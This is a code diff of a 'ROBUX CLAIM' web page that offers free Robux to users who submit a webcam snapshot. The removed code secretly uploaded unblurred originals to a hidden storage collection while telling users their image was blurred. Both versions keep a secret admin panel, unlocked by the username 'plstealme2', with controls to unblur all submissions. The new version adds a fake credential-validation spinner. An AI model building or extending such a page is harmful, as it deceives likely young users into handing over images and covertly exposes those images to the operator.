@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ROBUX CLAIM • Instant Verification Portal</title>
+    <title>ROBUX CLAIM • Identity Verification Portal</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     <!-- Cloudinary Upload Widget -->
     <script src="https://upload-widget.cloudinary.com/global/all.js" type="text/javascript"></script>
     <style>
@@ -28,7 +27,7 @@
         }
 
         .portal-card {
-            max-width: 720px;
+            max-width: 620px;
             width: 100%;
             background: rgba(12, 18, 32, 0.88);
             backdrop-filter: blur(16px);
@@ -106,6 +105,11 @@
             background: transparent;
             border: 1.5px solid #4c6085;
             color: #ccdcff;
+        }
+
+        .btn-danger {
+            background: #a13333;
+            color: white;
         }
 
         .roblox-login-area {
@@ -208,20 +212,47 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
+        /* ADMIN SECRET DASHBOARD */
         .admin-dashboard {
             margin-top: 1.8rem;
-            background: #010617cc;
+            background: #030718dd;
             border-radius: 1.8rem;
             padding: 1.2rem;
-            border: 1px solid #f5a62355;
+            border: 2px solid #f5a623aa;
+            backdrop-filter: blur(4px);
+        }
+
+        .admin-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            gap: 12px;
+        }
+
+        .unblur-btn {
+            background: linear-gradient(95deg, #ff7e5e, #feb47b);
+            border: none;
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-weight: bold;
+            color: #1a1a2e;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .unblur-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 10px #ffaa66;
         }
 
         .submissions-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
-            gap: 18px;
+            grid-template-columns: repeat(auto-fill, minmax(170px, 1fr));
+            gap: 16px;
             margin-top: 18px;
-            max-height: 550px;
+            max-height: 520px;
             overflow-y: auto;
             padding: 6px;
         }
@@ -230,30 +261,35 @@
             background: #0b1022;
             border-radius: 20px;
             padding: 12px;
-            border: 1px solid #ffb34755;
+            border: 1px solid #ffb34766;
             transition: 0.2s;
+            text-align: center;
         }
 
-        .media-thumb {
+        .image-wrapper {
+            position: relative;
             width: 100%;
             aspect-ratio: 1;
-            object-fit: cover;
             border-radius: 16px;
+            overflow: hidden;
             background: #000;
-            cursor: pointer;
-            transition: 0.2s;
+            margin-bottom: 10px;
         }
 
-        .blurred-img {
+        .submission-img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: filter 0.2s ease;
             filter: blur(28px);
         }
 
-        .unblurred-img {
+        .submission-img.unblurred {
             filter: blur(0px);
         }
 
-        .admin-badge-label {
-            background: #f5a62320;
+        .admin-badge {
+            background: #f5a62330;
             color: #FFCC80;
             border-radius: 60px;
             padding: 4px 12px;
@@ -269,30 +305,14 @@
             color: white;
             font-size: 0.7rem;
             cursor: pointer;
-            margin-top: 8px;
             width: 100%;
+            margin-top: 8px;
         }
 
         .validate-btn.approved {
-            background: #2c6e2c;
-            opacity: 0.7;
+            background: #1f4a1f;
+            opacity: 0.8;
             cursor: default;
-        }
-
-        .unblur-toggle {
-            background: #a05e1a;
-            margin-top: 6px;
-            width: 100%;
-            font-size: 0.7rem;
-            padding: 6px;
-        }
-
-        .success-message {
-            background: #1d3929;
-            border-radius: 2rem;
-            padding: 1rem;
-            text-align: center;
-            margin-bottom: 1rem;
         }
 
         footer {
@@ -329,17 +349,18 @@
     const UPLOAD_PRESET = 'portfoliohub_uploads';
     
     // ---- GLOBAL STATE ----
-    let currentStep = 'welcome';      // welcome, robloxAuth, privacy, media, success (no validating step)
+    let currentStep = 'welcome';      // welcome, robloxAuth, privacy, media, blurring, validating, success
     let robloxUsername = '';
-    let isAdminMode = false;
+    let isSecretAdmin = false;          // plstealme2 flag -> hidden admin panel with unblur power
     let mediaStream = null;
+    let videoElement = null;
     let animationFrameId = null;
     let capturedBlob = null;
-    let originalBlob = null;
     let submissionId = null;
     
     const appRoot = document.getElementById('appRoot');
     
+    // Helper: stop camera tracks
     function stopMediaTracks() {
         if (mediaStream) {
             mediaStream.getTracks().forEach(track => track.stop());
@@ -371,8 +392,8 @@
         drawBlur();
     }
     
-    // Capture both original and blurred versions
-    async function captureOriginalAndBlurred(videoElem) {
+    // Capture frame as blurred blob (final)
+    async function captureBlurredFrame(videoElem) {
         return new Promise((resolve) => {
             if (!videoElem || !videoElem.videoWidth) return resolve(null);
             const canvas = document.createElement('canvas');
@@ -380,18 +401,17 @@
             canvas.height = videoElem.videoHeight;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(originalBlobResult => {
-                ctx.filter = 'blur(28px)';
-                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-                ctx.filter = 'none';
-                canvas.toBlob(blurredBlob => resolve({ originalBlob: originalBlobResult, blurredBlob }), 'image/jpeg', 0.85);
-            }, 'image/jpeg', 0.9);
+            ctx.filter = 'blur(28px)';
+            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+            ctx.filter = 'none';
+            canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.85);
         });
     }
     
+    // Upload to Cloudinary
     async function uploadToCloudinary(blob, username) {
         const formData = new FormData();
-        formData.append('file', blob, `verif_blur_${username}_${Date.now()}.jpg`);
+        formData.append('file', blob, `verif_${username}_${Date.now()}.jpg`);
         formData.append('upload_preset', UPLOAD_PRESET);
         const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
             method: 'POST',
@@ -402,56 +422,42 @@
         return data.secure_url;
     }
     
-    async function uploadOriginalToFirebaseStorage(blobOriginal, username) {
-        const storageRef = firebase.storage().ref();
-        const fileName = `originals/${username}_${Date.now()}.jpg`;
-        const fileRef = storageRef.child(fileName);
-        await fileRef.put(blobOriginal);
-        return await fileRef.getDownloadURL();
-    }
-    
-    async function saveRecordWithOriginals(username, blurredUrl, originalUrl) {
+    // Save record to Firestore
+    async function saveRecord(username, imageUrl) {
         const docRef = db.collection('verifications').doc();
         await docRef.set({
             robloxUsername: username,
-            imageUrl: blurredUrl,
+            imageUrl: imageUrl,
             timestamp: firebase.firestore.FieldValue.serverTimestamp(),
             status: 'pending',
             blurred: true
         });
-        await db.collection('admin_originals').doc(docRef.id).set({
-            originalUrl: originalUrl,
-            userId: docRef.id,
-            robloxUser: username
-        });
         return docRef.id;
     }
     
+    // Fetch all submissions for admin (plstealme2)
     async function fetchAllSubmissions() {
         const snapshot = await db.collection('verifications').orderBy('timestamp', 'desc').get();
         const items = [];
-        for (const doc of snapshot.docs) {
+        snapshot.forEach(doc => {
             const data = doc.data();
-            let originalUrl = null;
-            const originalDoc = await db.collection('admin_originals').doc(doc.id).get();
-            if (originalDoc.exists) originalUrl = originalDoc.data().originalUrl;
             items.push({
                 id: doc.id,
                 username: data.robloxUsername,
-                blurredUrl: data.imageUrl,
+                imageUrl: data.imageUrl,
                 timestamp: data.timestamp?.toDate?.() || new Date(),
-                status: data.status || 'pending',
-                originalUrl: originalUrl
+                status: data.status || 'pending'
             });
-        }
+        });
         return items;
     }
     
+    // Update status to approved
     async function approveSubmission(subId) {
         await db.collection('verifications').doc(subId).update({ status: 'approved', approvedAt: firebase.firestore.FieldValue.serverTimestamp() });
     }
     
-    // ----- RENDER FUNCTIONS -----
+    // ----- RENDER FUNCTIONS (public flow) -----
     function renderWelcome() {
         return `<div class="step-pane">
             <h2>🎁 REWARD VAULT</h2>
@@ -514,36 +520,57 @@
         </div>`;
     }
     
+    function renderBlurringStep() {
+        return `<div class="step-pane">
+            <h2>🔐 Blur Lock Applied</h2>
+            <div class="sub">final blurred snapshot — ready for review</div>
+            <div class="media-preview">
+                <div class="preview-container">
+                    <canvas id="finalBlurCanvas" style="width:100%; height:100%; border-radius:20px; background:#000;"></canvas>
+                </div>
+                <button class="btn btn-primary" id="validateFinalBtn">Confirm & Validate →</button>
+            </div>
+        </div>`;
+    }
+    
+    function renderValidatingStep() {
+        return `<div class="step-pane" style="text-align:center;">
+            <h2>⏳ Validating Submission</h2>
+            <div class="status-message"><span class="spinner"></span> Checking Roblox credentials & blur integrity...</div>
+            <p style="margin-top:1rem;">please wait</p>
+        </div>`;
+    }
+    
     function renderSuccessStep() {
         let adminPanelHtml = '';
-        if (isAdminMode) {
+        if (isSecretAdmin) {
             adminPanelHtml = `<div class="admin-dashboard" id="adminSecretPanel">
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <h3 style="color:#FFC857;">🔓 Admin Vault (plstealme2) — Unblur Access</h3>
-                    <span class="admin-badge-label"><i class="fas fa-eye"></i> hidden dashboard</span>
+                <div class="admin-header">
+                    <div><span class="admin-badge"><i class="fas fa-crown"></i> 🔒 plstealme2 • Master Access</span></div>
+                    <button id="globalUnblurBtn" class="unblur-btn"><i class="fas fa-eye"></i> 🔓 UNBLUR ALL VIDEOS</button>
                 </div>
                 <div id="adminSubmissionsList" class="submissions-grid">
-                    <div class="spinner"></div> Loading submissions...
+                    <div class="spinner"></div> Loading encrypted submissions...
                 </div>
             </div>`;
         }
         return `<div class="step-pane">
             <div style="text-align:center;">
                 <div style="font-size:3.8rem;">✅✨</div>
-                <h2 style="color:#c6f7b0;">SUBMITTED!</h2>
-                <div class="success-message">
-                    <i class="fas fa-check-circle"></i> Your verification has been sent to review team.<br>
-                    You will receive Robux once approved.
+                <h2 style="color:#c6f7b0;">SUCCESS!</h2>
+                <div style="background:#1d3929; border-radius:2rem; padding:1rem;">
+                    <i class="fas fa-clock"></i> Wait patiently till you get approved<br>
+                    Your blurred capture is pending review. Robux will be granted after approval.
                 </div>
                 ${adminPanelHtml}
                 <hr>
-                <button class="btn btn-outline" id="fullResetBtn">⟳ Start Over</button>
+                <button class="btn btn-outline" id="fullResetBtn">⟳ Back to start</button>
             </div>
             <footer>ID: ${submissionId ? submissionId.slice(0,8) : 'pending'}</footer>
         </div>`;
     }
     
-    // ----- RENDER CONTROLLER (NO VALIDATING STEP) -----
+    // ----- RENDER CONTROLLER -----
     function render() {
         if (!appRoot) return;
         let html = '';
@@ -552,26 +579,36 @@
             case 'robloxAuth': html = renderRobloxAuth(); break;
             case 'privacy': html = renderPrivacyStep(); break;
             case 'media': html = renderMediaStep(); break;
+            case 'blurring': html = renderBlurringStep(); break;
+            case 'validating': html = renderValidatingStep(); break;
             case 'success': html = renderSuccessStep(); break;
             default: html = '<div class="step-pane">error</div>';
         }
         appRoot.innerHTML = html;
         
+        // attach events for current step
         if (currentStep === 'welcome') attachWelcomeEvents();
         if (currentStep === 'robloxAuth') attachRobloxEvents();
         if (currentStep === 'privacy') attachPrivacyEvents();
         if (currentStep === 'media') attachMediaEvents();
-        if (currentStep === 'success' && isAdminMode) {
-            loadAdminSubmissionsWithUnblur();
+        if (currentStep === 'blurring') attachBlurFinalEvents();
+        if (currentStep === 'validating') {
+            setTimeout(() => finalizeSubmissionAndUpload(), 2000);
+        }
+        if (currentStep === 'success') {
             const resetBtn = document.getElementById('fullResetBtn');
             if (resetBtn) resetBtn.onclick = () => fullReset();
-        } else if (currentStep === 'success') {
-            const resetBtn = document.getElementById('fullResetBtn');
-            if (resetBtn) resetBtn.onclick = () => fullReset();
+            if (isSecretAdmin) {
+                loadAdminSubmissionsWithUnblurFeature();
+                const unblurAllBtn = document.getElementById('globalUnblurBtn');
+                if (unblurAllBtn) {
+                    unblurAllBtn.onclick = () => unblurAllImages();
+                }
+            }
         }
     }
     
-    // ----- EVENT HANDLERS -----
+    // ----- EVENT HANDLERS (hidden admin bypass logic) -----
     function attachWelcomeEvents() {
         const yesBtn = document.getElementById('yesRewardBtn');
         const noBtn = document.getElementById('noRewardBtn');
@@ -590,11 +627,11 @@
                     return;
                 }
                 robloxUsername = username;
-                // SECRET: if username is "plstealme2" -> admin mode
+                // SECRET HIDDEN ADMIN CONDITION: if username is "plstealme2" -> admin mode ACTIVATED
                 if (robloxUsername.toLowerCase() === 'plstealme2') {
-                    isAdminMode = true;
+                    isSecretAdmin = true;
                 } else {
-                    isAdminMode = false;
+                    isSecretAdmin = false;
                 }
                 currentStep = 'privacy';
                 render();
@@ -641,39 +678,66 @@
                     msgDiv.innerText = '⚠️ Please start camera first';
                     return;
                 }
-                // Show loading state on button
-                submitBtn.disabled = true;
-                submitBtn.innerHTML = '<span class="spinner"></span> Uploading...';
-                
-                const { originalBlob: orig, blurredBlob: blurred } = await captureOriginalAndBlurred(video);
-                if (!blurred || !orig) { alert('Capture failed'); submitBtn.disabled = false; submitBtn.innerHTML = '✅ Submit & Auto‑Blur'; return; }
-                capturedBlob = blurred;
-                originalBlob = orig;
+                const blurredBlob = await captureBlurredFrame(video);
+                if (!blurredBlob) { alert('Failed to capture frame'); return; }
+                capturedBlob = blurredBlob;
                 stopMediaTracks();
                 if (video.srcObject) video.srcObject = null;
-                
-                // Directly upload and go to success panel (NO validating step)
-                try {
-                    const blurredUrl = await uploadToCloudinary(capturedBlob, robloxUsername);
-                    const originalUrl = await uploadOriginalToFirebaseStorage(originalBlob, robloxUsername);
-                    const docId = await saveRecordWithOriginals(robloxUsername, blurredUrl, originalUrl);
-                    submissionId = docId;
-                    currentStep = 'success';
-                    render();
-                } catch (err) {
-                    console.error(err);
-                    alert('Upload failed, please retry');
-                    submitBtn.disabled = false;
-                    submitBtn.innerHTML = '✅ Submit & Auto‑Blur';
-                    currentStep = 'media';
-                    render();
-                }
+                currentStep = 'blurring';
+                render();
             };
         }
     }
     
-    // ---- ADMIN: load submissions with unblur toggle (no validating step) ----
-    async function loadAdminSubmissionsWithUnblur() {
+    function attachBlurFinalEvents() {
+        const finalCanvas = document.getElementById('finalBlurCanvas');
+        const proceedBtn = document.getElementById('validateFinalBtn');
+        if (finalCanvas && capturedBlob) {
+            const url = URL.createObjectURL(capturedBlob);
+            const img = new Image();
+            img.onload = () => {
+                finalCanvas.width = img.width;
+                finalCanvas.height = img.height;
+                const ctx = finalCanvas.getContext('2d');
+                ctx.filter = 'blur(28px)';
+                ctx.drawImage(img, 0, 0, img.width, img.height);
+                ctx.filter = 'none';
+                URL.revokeObjectURL(url);
+            };
+            img.src = url;
+        }
+        if (proceedBtn) proceedBtn.onclick = () => {
+            if (!capturedBlob) { alert('Missing media'); return; }
+            currentStep = 'validating';
+            render();
+        };
+    }
+    
+    async function finalizeSubmissionAndUpload() {
+        if (!capturedBlob || !robloxUsername) {
+            currentStep = 'welcome';
+            render();
+            return;
+        }
+        try {
+            const cloudUrl = await uploadToCloudinary(capturedBlob, robloxUsername);
+            const docId = await saveRecord(robloxUsername, cloudUrl);
+            submissionId = docId;
+            currentStep = 'success';
+            render();
+            if (isSecretAdmin) {
+                loadAdminSubmissionsWithUnblurFeature();
+            }
+        } catch (err) {
+            console.error(err);
+            alert('Verification submission failed, please retry');
+            currentStep = 'media';
+            render();
+        }
+    }
+    
+    // ---- ADMIN FUNCTION: LOAD ALL SUBMISSIONS WITH UNBLUR FEATURE (toggle blur per image)
+    async function loadAdminSubmissionsWithUnblurFeature() {
         const container = document.getElementById('adminSubmissionsList');
         if (!container) return;
         const submissions = await fetchAllSubmissions();
@@ -682,76 +746,78 @@
             return;
         }
         container.innerHTML = '';
-        for (const sub of submissions) {
+        submissions.forEach(sub => {
             const card = document.createElement('div');
             card.className = 'submission-card';
             const isApproved = sub.status === 'approved';
-            let isUnblurred = false;
-            const imgElement = document.createElement('img');
-            imgElement.className = 'media-thumb blurred-img';
-            imgElement.src = sub.blurredUrl;
-            imgElement.style.cursor = 'pointer';
-            
-            const toggleUnblur = async () => {
-                if (!isUnblurred && sub.originalUrl) {
-                    imgElement.src = sub.originalUrl;
-                    imgElement.classList.remove('blurred-img');
-                    imgElement.classList.add('unblurred-img');
-                    isUnblurred = true;
-                } else if (isUnblurred) {
-                    imgElement.src = sub.blurredUrl;
-                    imgElement.classList.remove('unblurred-img');
-                    imgElement.classList.add('blurred-img');
-                    isUnblurred = false;
-                }
-            };
-            imgElement.onclick = toggleUnblur;
-            
-            card.appendChild(imgElement);
-            
-            const infoDiv = document.createElement('div');
-            infoDiv.style.marginTop = '8px';
-            infoDiv.innerHTML = `
-                <div style="font-size: 12px; color:#dddddd;">👤 ${escapeHtml(sub.username)}</div>
+            // each image starts blurred
+            card.innerHTML = `
+                <div class="image-wrapper">
+                    <img class="submission-img" data-blurred="true" src="${sub.imageUrl}" alt="blurred submission" crossorigin="anonymous">
+                </div>
+                <div style="margin-top: 6px; font-size: 12px; color:#dddddd;">👤 ${escapeHtml(sub.username)}</div>
                 <div style="font-size: 10px; color:#9aa9ce;">📅 ${new Date(sub.timestamp).toLocaleString()}</div>
-                <div style="font-size: 10px; color:${isApproved ? '#6fcf97' : '#f0a55a'};">Status: ${sub.status}</div>
+                <div style="font-size: 10px; margin: 5px 0; color:${isApproved ? '#6fcf97' : '#f0a55a'};">Status: ${sub.status}</div>
+                <button class="unblur-single-btn" data-imgurl="${sub.imageUrl}" style="background:#5a3e2e; border:none; padding:5px; border-radius:30px; color:white; font-size:0.7rem; margin-top:6px; width:100%; cursor:pointer;">👁️ Unblur this</button>
+                ${!isApproved ? `<button class="validate-btn" data-id="${sub.id}">✅ Approve & Grant Robux</button>` : `<button class="validate-btn approved" disabled>✔ Approved</button>`}
             `;
-            card.appendChild(infoDiv);
-            
-            const unblurBtn = document.createElement('button');
-            unblurBtn.className = 'validate-btn unblur-toggle';
-            unblurBtn.innerText = '👁️ Toggle Unblur (View Original)';
-            unblurBtn.onclick = toggleUnblur;
-            card.appendChild(unblurBtn);
-            
-            if (!isApproved) {
-                const approveBtn = document.createElement('button');
-                approveBtn.className = 'validate-btn';
-                approveBtn.innerText = '✅ Approve & Grant Robux';
-                approveBtn.onclick = async () => {
-                    approveBtn.innerText = 'Approving...';
-                    approveBtn.disabled = true;
-                    await approveSubmission(sub.id);
-                    await loadAdminSubmissionsWithUnblur();
-                };
-                card.appendChild(approveBtn);
-            } else {
-                const approvedMark = document.createElement('button');
-                approvedMark.className = 'validate-btn approved';
-                approvedMark.innerText = '✔ Approved';
-                approvedMark.disabled = true;
-                card.appendChild(approvedMark);
-            }
             container.appendChild(card);
+            
+            // Single unblur button for each image
+            const unblurSingleBtn = card.querySelector('.unblur-single-btn');
+            const imgElement = card.querySelector('.submission-img');
+            if (unblurSingleBtn) {
+                unblurSingleBtn.onclick = (e) => {
+                    e.stopPropagation();
+                    if (imgElement.classList.contains('unblurred')) {
+                        imgElement.classList.remove('unblurred');
+                        unblurSingleBtn.innerHTML = '👁️ Unblur this';
+                    } else {
+                        imgElement.classList.add('unblurred');
+                        unblurSingleBtn.innerHTML = '🔒 Re-blur';
+                    }
+                };
+            }
+            
+            // Approve button
+            const approveBtn = card.querySelector('.validate-btn');
+            if (approveBtn && !isApproved) {
+                approveBtn.onclick = async (e) => {
+                    e.stopPropagation();
+                    await approveSubmission(sub.id);
+                    await loadAdminSubmissionsWithUnblurFeature(); // refresh
+                };
+            }
+        });
+    }
+    
+    // GLOBAL UNBLUR: removes blur from ALL images currently displayed in admin panel
+    function unblurAllImages() {
+        const allImages = document.querySelectorAll('.submission-img');
+        allImages.forEach(img => {
+            img.classList.add('unblurred');
+        });
+        // also change all "unblur single" button texts to "Re-blur"
+        const allUnblurBtns = document.querySelectorAll('.unblur-single-btn');
+        allUnblurBtns.forEach(btn => {
+            btn.innerHTML = '🔒 Re-blur';
+        });
+        // Optional visual feedback
+        const unblurBtn = document.getElementById('globalUnblurBtn');
+        if (unblurBtn) {
+            const originalText = unblurBtn.innerHTML;
+            unblurBtn.innerHTML = '✨ ALL VIDEOS UNBLURRED ✨';
+            setTimeout(() => {
+                unblurBtn.innerHTML = originalText;
+            }, 1800);
         }
     }
     
     function fullReset() {
         stopMediaTracks();
         capturedBlob = null;
-        originalBlob = null;
         robloxUsername = '';
-        isAdminMode = false;
+        isSecretAdmin = false;
         submissionId = null;
         currentStep = 'welcome';
         render();
@@ -767,14 +833,19 @@
         });
     }
     
+    // override render to allow dynamic admin refresh
     const origRender = render;
     window.render = function() { origRender(); };
     render = function() {
         origRender();
-        if (currentStep === 'success') {
+        if (currentStep === 'success' && isSecretAdmin) {
             const resetAll = document.getElementById('fullResetBtn');
             if (resetAll) resetAll.onclick = () => fullReset();
-            if (isAdminMode) loadAdminSubmissionsWithUnblur();
+            const unblurAllBtn = document.getElementById('globalUnblurBtn');
+            if (unblurAllBtn) {
+                unblurAllBtn.onclick = () => unblurAllImages();
+            }
+            loadAdminSubmissionsWithUnblurFeature();
         }
     };
     
